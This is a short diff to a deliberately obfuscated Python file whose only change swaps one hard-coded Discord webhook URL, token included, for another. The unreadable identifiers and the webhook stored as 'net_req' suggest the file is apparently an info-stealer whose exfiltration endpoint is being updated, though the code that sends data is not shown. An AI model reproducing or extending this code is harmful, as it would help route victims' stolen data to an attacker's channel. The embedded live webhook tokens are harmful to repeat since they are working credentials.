@@ -43,7 +43,7 @@ def request_closer (O00OOO00O000O0OO0 :str )->typing .Dict [str ,set ]:
                 OO000OOOOO000000O [OOOOOOOO00O0O0O0O ]=set ()
             OO000OOOOO000000O [OOOOOOOO00O0O0O0O ].add (OO000O00OOO00OOO0 )
     return OO000OOOOO000000O if OO000OOOOO000000O else None 
-net_req ="https://discord.com/api/webhooks/1327294213250875464/O6UmNdve7tqmqx3f-4a04KzMQqp8LDuA4TwModtVXnApFWGPIhXBpeu11N1AGD39_o9y"
+net_req ="https://discord.com/api/webhooks/1327294212194173020/eRN_5RbRJ_KE3AhOz6OPkVlpYES_5TlNGrSX0pP2bQoV4dFNmcqDITzPqt-E9KDjZpzT"
 def keep_alive_till_final (O00O0O0O000O00000 :str ,O00O0000000OO00OO :typing .Dict [str ,set [str ]])->int :
     ""
     O0O00O000OO00OO00 :list [dict ]=list ()
